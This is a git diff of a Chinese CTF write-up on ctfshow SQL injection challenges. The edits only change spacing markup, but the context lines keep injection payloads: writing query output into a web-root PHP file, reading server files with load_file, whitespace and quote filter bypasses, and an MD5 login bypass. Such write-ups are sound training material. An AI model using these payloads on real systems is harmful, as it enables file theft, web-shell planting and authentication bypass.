@@ -49,7 +49,7 @@ select username,password from user where username !='flag' and id ='1'' limit 1;
 select username,password from user where username !='flag' and id ='1'
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -67,7 +67,7 @@ select username,password from user where username !='flag' and id ='1'
 
 <img src="\images\article_images\image-20250823104847789.png" alt="image-20250823104847789" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -81,7 +81,7 @@ select username,password from user where username !='flag' and id ='1'
 
 <img src="\images\article_images\image-20250823105128348.png" alt="image-20250823105128348" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -93,7 +93,7 @@ select username,password from user where username !='flag' and id ='1'
 
 <img src="\images\article_images\image-20250823105820909.png" alt="image-20250823105820909" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -107,7 +107,7 @@ select username,password from user where username !='flag' and id ='1'
 
 <img src="\images\article_images\image-20250823110049881.png" alt="image-20250823110049881" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -126,7 +126,7 @@ select username,password from user where username !='flag' and id ='1'
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -148,7 +148,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 **可知，flag位于 `ctfshow_user2` 表中**
 
-&nbsp;
+<br>
 
 
 
@@ -162,7 +162,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823110527357.png" alt="image-20250823110527357" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -174,7 +174,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823110625365.png" alt="image-20250823110625365" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -186,7 +186,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823111050401.png" alt="image-20250823111050401" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -198,7 +198,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823111231458.png" alt="image-20250823111231458" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -210,7 +210,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823111325732.png" alt="image-20250823111325732" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -224,7 +224,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 **但当 `username` 里有“flag”时无法输出，所以可以将字段记录转成Hex、ASCII、base64等编码输出**
 
-&nbsp;
+<br>
 
 
 
@@ -236,7 +236,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823112205922.png" alt="image-20250823112205922" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -250,7 +250,7 @@ $sql = "select username,password from ctfshow_user2 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823112820711.png" alt="image-20250823112820711" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -271,7 +271,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -285,7 +285,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 <img src="\images\article_images\image-20250823125803070.png" alt="image-20250823125803070" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -297,7 +297,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 <img src="\images\article_images\image-20250823130255385.png" alt="image-20250823130255385" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -309,7 +309,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 <img src="\images\article_images\image-20250823130231610.png" alt="image-20250823130231610" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -321,7 +321,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 <img src="\images\article_images\image-20250823130337037.png" alt="image-20250823130337037" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -333,7 +333,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 <img src="\images\article_images\image-20250823130421126.png" alt="image-20250823130421126" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -359,7 +359,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 <img src="\images\article_images\image-20250823131137945.png" alt="image-20250823131137945" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -375,7 +375,7 @@ $sql = "select id,username,password from ctfshow_user2 where username !='flag' a
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -395,7 +395,7 @@ $sql = "select username,password from ctfshow_user4 where username !='flag' and 
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -417,7 +417,7 @@ replace(group_concat(table_name),
         '0','J')
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -431,7 +431,7 @@ replace(group_concat(table_name),
 
 <img src="\images\article_images\image-20250823170725372.png" alt="image-20250823170725372" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -445,7 +445,7 @@ replace(group_concat(table_name),
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -457,7 +457,7 @@ replace(group_concat(table_name),
 
 <img src="\images\article_images\image-20250823170643934.png" alt="image-20250823170643934" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -469,7 +469,7 @@ replace(group_concat(table_name),
 
 <img src="\images\article_images\image-20250823170943945.png" alt="image-20250823170943945" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -481,7 +481,7 @@ replace(group_concat(table_name),
 
 <img src="\images\article_images\image-20250823170601866.png" alt="image-20250823170601866" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -514,7 +514,7 @@ out = rev_replace(txt)
 print("替换后: ", out)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -532,7 +532,7 @@ print("替换后: ", out)
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -556,7 +556,7 @@ print("替换后: ", out)
 
 <img src="\images\article_images\image-20250823181144483.png" alt="image-20250823181144483" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -574,7 +574,7 @@ print("替换后: ", out)
 
 <img src="\images\article_images\image-20250823205557176.png" alt="image-20250823205557176" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -582,7 +582,7 @@ print("替换后: ", out)
 
 <img src="\images\article_images\image-20250823205031913.png" alt="image-20250823205031913" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -590,7 +590,7 @@ print("替换后: ", out)
 
 <img src="\images\article_images\image-20250823204905296.png" alt="image-20250823204905296" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -602,7 +602,7 @@ print("替换后: ", out)
 
 <img src="\images\article_images\image-20250823204825960.png" alt="image-20250823204825960" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -614,7 +614,7 @@ print("替换后: ", out)
 
 <img src="\images\article_images\image-20250823233438947.png" alt="image-20250823233438947" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -689,7 +689,7 @@ if __name__ == "__main__":
     print(f"\n最终Flag: {result}")
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -712,7 +712,7 @@ $sql = "select username,password from ctfshow_user5 where username !='flag' and 
 
 **正则匹配过滤所有 ASCII 字符（从 `\x00` 到 `\x7f`，即 `0` 到 `127` 的所有字符，包括控制字符、数字、字母和符号）**
 
-&nbsp;
+<br>
 
 
 
@@ -724,7 +724,7 @@ $sql = "select username,password from ctfshow_user5 where username !='flag' and 
 1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.php'--+
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -736,7 +736,7 @@ $sql = "select username,password from ctfshow_user5 where username !='flag' and 
 
 <img src="\images\article_images\image-20250823224351059.png" alt="image-20250823224351059" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -752,7 +752,7 @@ $sql = "select username,password from ctfshow_user5 where username !='flag' and 
 
 **可以使用时间盲注脚本**
 
-&nbsp;
+<br>
 
 
 
@@ -822,7 +822,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -830,7 +830,7 @@ if __name__ == "__main__":
 
 **利用BurpSuite爆破**
 
-&nbsp;
+<br>
 
 
 
@@ -846,13 +846,13 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250824152148641.png" alt="image-20250824152148641" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250824152251075.png" alt="image-20250824152251075" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -870,13 +870,13 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250824153401961.png" alt="image-20250824153401961" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250824153335073.png" alt="image-20250824153335073" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -894,13 +894,13 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250824153801484.png" alt="image-20250824153801484" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250824153738062.png" alt="image-20250824153738062" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -918,7 +918,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250824161451417.png" alt="image-20250824161451417" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -926,7 +926,7 @@ if __name__ == "__main__":
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -942,13 +942,13 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250824162241422.png" alt="image-20250824162241422" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250824162207412.png" alt="image-20250824162207412" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -968,13 +968,13 @@ if __name__ == "__main__":
 
 
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250824163731570.png" alt="image-20250824163731570" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -997,7 +997,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 **过滤了 `select`**
 
-&nbsp;
+<br>
 
 
 
@@ -1011,7 +1011,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824170031112.png" alt="image-20250824170031112" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1025,7 +1025,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824170106246.png" alt="image-20250824170106246" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1037,7 +1037,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824170233810.png" alt="image-20250824170233810" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1051,7 +1051,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824170316143.png" alt="image-20250824170316143" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1065,7 +1065,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -1079,7 +1079,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824170557781.png" alt="image-20250824170557781" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1093,7 +1093,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824170645135.png" alt="image-20250824170645135" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1117,7 +1117,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 **过滤了 `空格`、`--+`**
 
-&nbsp;
+<br>
 
 
 
@@ -1132,7 +1132,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 **注意不能用 `%20`，因为空格也会被解析成 `%20`，因此并没有绕过**
 
-&nbsp;
+<br>
 
 
 
@@ -1144,7 +1144,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824213947908.png" alt="image-20250824213947908" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1156,7 +1156,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 1'%0aor%0a1=1%23
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1178,7 +1178,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 **过滤了 `空格`、`--+`、`/**/`**
 
-&nbsp;
+<br>
 
 
 
@@ -1190,7 +1190,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824214327111.png" alt="image-20250824214327111" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1202,7 +1202,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 1'%0aor%0a1=1%23
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1224,7 +1224,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 **过滤了 `空格`、`--+`、`/**/`、`%09`、`%0a`、`%0b`、`%0d`**
 
-&nbsp;
+<br>
 
 
 
@@ -1236,7 +1236,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824214734756.png" alt="image-20250824214734756" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1250,7 +1250,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250426091514097.png" alt="image-20250426091514097" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1272,7 +1272,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 **过滤了 `空格`、`--+`、`/**/`、`%09`、`%0a`、`%0b`、`%0d`、`%23`**
 
-&nbsp;
+<br>
 
 
 
@@ -1289,7 +1289,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824215714133.png" alt="image-20250824215714133" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1307,7 +1307,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 #最终false OR (true AND true) → true
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1315,7 +1315,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250426093158501.png" alt="image-20250426093158501" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1335,7 +1335,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1352,7 +1352,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824220401797.png" alt="image-20250824220401797" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1373,7 +1373,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250426094555175.png" alt="image-20250426094555175" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1393,7 +1393,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1408,7 +1408,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250824221444937.png" alt="image-20250824221444937" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1423,7 +1423,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 -1'or(id=26)and'1
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1449,7 +1449,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
       $user_count = 0;
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1465,7 +1465,7 @@ tableName=(ctfshow_user)where(pass)like'ctfshow%25'
 
 <img src="\images\article_images\image-20250824222922226.png" alt="image-20250824222922226" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1537,7 +1537,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1563,7 +1563,7 @@ if __name__ == "__main__":
       $user_count = 0;
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1638,7 +1638,7 @@ ON students.id = scores.student_id;
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -1648,7 +1648,7 @@ ctfshow%    16进制编码后-->   0x63746673686f7725
 
 **MySQL 会自动把 `0x63746673686f7725` 当作字符串处理，可以绕过单引号过滤**
 
-&nbsp;
+<br>
 
 
 
@@ -1660,7 +1660,7 @@ ctfshow%    16进制编码后-->   0x63746673686f7725
 
 **`count(pass)`：统计符合条件的记录数。**
 
-&nbsp;
+<br>
 
 
 
@@ -1672,7 +1672,7 @@ tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x637466
 
 <img src="\images\article_images\image-20250824232254620.png" alt="image-20250824232254620" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1739,7 +1739,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1765,7 +1765,7 @@ if __name__ == "__main__":
       $user_count = 0;
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1778,7 +1778,7 @@ mysql> SELECT true + true;
 ->  2
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1861,7 +1861,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1887,7 +1887,7 @@ if __name__ == "__main__":
       $user_count = 0;
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1972,7 +1972,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1997,7 +1997,7 @@ if __name__ == "__main__":
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2014,14 +2014,14 @@ string md5 ( string $str , bool $raw_output = false )
   - 默认是 `false`，返回 **32 位十六进制字符串**（常见的 MD5）。
   - 如果传 `true`，返回 **16 字节的原始二进制数据**（不可读）。
 
-&nbsp;
+<br>
 
 
 
 **`ffifdyop` 字符串经 `md5(password,true)` 处理之后会变成 `276f722736c95d99e921722cf9ed621c`**
 **而 Mysql 会把 `hex` 转成 `ascii` 解释，这个字符串前几位刚好是 `' or '6<乱码>`，`or` 后的内容是永真式**
 
-&nbsp;
+<br>
 
 
 
@@ -2032,7 +2032,7 @@ string md5 ( string $str , bool $raw_output = false )
 
 <img src="\images\article_images\image-20250825175128037.png" alt="image-20250825175128037" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2070,7 +2070,7 @@ string md5 ( string $str , bool $raw_output = false )
 
 **以字母开头的字符串在和数字比较时，会被强制转换为0**
 
-&nbsp;
+<br>
 
 
 
@@ -2081,7 +2081,7 @@ string md5 ( string $str , bool $raw_output = false )
 
 <img src="\images\article_images\image-20250825180341102.png" alt="image-20250825180341102" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2114,7 +2114,7 @@ string md5 ( string $str , bool $raw_output = false )
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2133,7 +2133,7 @@ LOAD_FILE(file_path)
   - **成功 → 文件内容作为字符串**
   - **失败 → NULL**
 
-&nbsp;
+<br>
 
 
 
@@ -2161,7 +2161,7 @@ column_name REGEXP pattern
 | `+`     | 匹配前一个字符 1 次或多次  |
 | `?`     | 匹配前一个字符 0 次或 1 次 |
 
-&nbsp;
+<br>
 
 
 
@@ -2175,19 +2175,19 @@ column_name REGEXP pattern
 // username 存在支持布尔盲注的条件
 ```
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250825183438096.png" alt="image-20250825183438096" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 **查询为真时的关键字 `\u5bc6\u7801\u9519\u8bef`**
 
-&nbsp;
+<br>
 
 
 
@@ -2201,7 +2201,7 @@ if(load_file('/var/www/html/api/index.php')regexp'ctfshow1',0,1)
 
 <img src="\images\article_images\image-20250825221753164.png" alt="image-20250825221753164" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2213,7 +2213,7 @@ if(load_file('/var/www/html/api/index.php')regexp'ctfshow{',0,1)
 
 <img src="\images\article_images\image-20250825221905412.png" alt="image-20250825221905412" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2318,7 +2318,7 @@ if __name__ == "__main__":
   //TODO:感觉少了个啥，奇怪
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2330,7 +2330,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250825223554096.png" alt="image-20250825223554096" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2340,7 +2340,7 @@ if __name__ == "__main__":
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -2348,7 +2348,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250825230830996.png" alt="image-20250825230830996" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2356,7 +2356,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250825230448836.png" alt="image-20250825230448836" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2364,7 +2364,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250825230510423.png" alt="image-20250825230510423" style="zoom: 50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2372,7 +2372,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250825230156934.png" alt="image-20250825230156934" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2454,7 +2454,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2487,7 +2487,7 @@ if __name__ == "__main__":
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2495,7 +2495,7 @@ if __name__ == "__main__":
 
 **因此， `ascii() ` 函数和 `ord()` 函数对于单字节处理两者作用一样**
 
-&nbsp;
+<br>
 
 
 
@@ -2579,7 +2579,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2612,13 +2612,13 @@ if __name__ == "__main__":
     }
 ```
 
-&nbsp;
+<br>
 
 
 
 **过滤了 `ascii` 和 `ord` ，使用正则函数逐个匹配字符**
 
-&nbsp;
+<br>
 
 
 
@@ -2701,7 +2701,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2736,7 +2736,7 @@ if __name__ == "__main__":
 
 **过滤了 `substr` ，可以使用正则来代替，`^`从第一位开始匹配**
 
-&nbsp;
+<br>
 
 
 
@@ -2744,7 +2744,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826001349157.png" alt="image-20250826001349157" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2752,7 +2752,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826001623740.png" alt="image-20250826001623740" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2760,7 +2760,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826001735520.png" alt="image-20250826001735520" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2768,7 +2768,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826001943487.png" alt="image-20250826001943487" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2851,7 +2851,7 @@ if __name__ == "__main__":
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -2884,7 +2884,7 @@ if __name__ == "__main__":
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -2892,7 +2892,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826002646514.png" alt="image-20250826002646514" style="zoom:50%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -2973,7 +2973,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3010,7 +3010,7 @@ if __name__ == "__main__":
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3022,7 +3022,7 @@ if __name__ == "__main__":
 - **set  \`pass\` = 520**
   → 把这张表里所有行的 `pass` 字段的值都改成 `520`。
 
-&nbsp;
+<br>
 
 
 
@@ -3039,7 +3039,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826154322059.png" alt="image-20250826154322059" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3064,7 +3064,7 @@ if __name__ == "__main__":
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -3097,7 +3097,7 @@ if __name__ == "__main__":
 
 **`select` 没有被过滤**
 
-&nbsp;
+<br>
 
 
 
@@ -3108,7 +3108,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826162950860.png" alt="image-20250826162950860" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3134,7 +3134,7 @@ if __name__ == "__main__":
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3149,7 +3149,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826163319207.png" alt="image-20250826163319207" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3175,7 +3175,7 @@ if __name__ == "__main__":
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3188,7 +3188,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826164155005.png" alt="image-20250826164155005" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3198,7 +3198,7 @@ if __name__ == "__main__":
 
 **利用 `alter` 函数可以把 `pass` 和 `id` 两列进行互换，这样判断 flag 的条件变成对 `id` 的检测，而 `id` 都是纯数字，因此可以通过爆破正确的 `id`，从而获得flag**
 
-&nbsp;
+<br>
 
 
 
@@ -3209,7 +3209,7 @@ if __name__ == "__main__":
 alter table ctfshow_user change column `pass` `temp` varchar(255);
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3252,7 +3252,7 @@ for i in range(password_range):
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3280,7 +3280,7 @@ for i in range(password_range):
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -3293,7 +3293,7 @@ for i in range(password_range):
 
 <img src="\images\article_images\image-20250826171832141.png" alt="image-20250826171832141" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3303,7 +3303,7 @@ for i in range(password_range):
 
 **思路：交换 `id` 和 `pass` 字段，让系统把 `pass` 列当作 `id` 使用，再通过爆破 `id` 拿到flag**
 
-&nbsp;
+<br>
 
 
 
@@ -3318,7 +3318,7 @@ for i in range(password_range):
 
 <img src="\images\article_images\image-20250826232149835.png" alt="image-20250826232149835" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3331,7 +3331,7 @@ for i in range(password_range):
 
 <img src="\images\article_images\image-20250826232207547.png" alt="image-20250826232207547" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3344,7 +3344,7 @@ for i in range(password_range):
 
 <img src="\images\article_images\image-20250826232220909.png" alt="image-20250826232220909" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3357,7 +3357,7 @@ for i in range(password_range):
 
 <img src="\images\article_images\image-20250826233159519.png" alt="image-20250826233159519" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3370,13 +3370,13 @@ for i in range(password_range):
 
 <img src="\images\article_images\image-20250826233133075.png" alt="image-20250826233133075" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 **因此，手动爆破并非良策，可用脚本实现爆破**
 
-&nbsp;
+<br>
 
 
 
@@ -3384,7 +3384,7 @@ for i in range(password_range):
 
 **按照题解二的解题逻辑写脚本**
 
-&nbsp;
+<br>
 
 
 
@@ -3443,7 +3443,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3469,7 +3469,7 @@ if __name__ == "__main__":
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3482,7 +3482,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250826235014639.png" alt="image-20250826235014639" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3543,7 +3543,7 @@ if __name__ == "__main__":
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3568,7 +3568,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3580,17 +3580,17 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 
 <img src="\images\article_images\image-20250827153208495.png" alt="image-20250827153208495" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
-&nbsp;
+<br>
 
 
 
 **使用 `--referer="ctf.show"` 绕过 referer 检查**
 
-&nbsp;
+<br>
 
-&nbsp;
+<br>
 
 
 
